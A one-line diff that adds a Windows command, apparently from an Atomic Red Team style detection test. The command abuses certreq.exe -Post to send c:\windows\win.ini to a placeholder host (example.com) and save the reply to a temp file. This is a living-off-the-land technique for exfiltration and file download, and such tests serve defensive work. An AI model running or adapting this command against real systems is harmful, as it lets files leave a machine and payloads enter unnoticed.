@@ -1,0 +1,1 @@
+certreq.exe  -Post -config https://example.com c:\windows\win.ini C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt
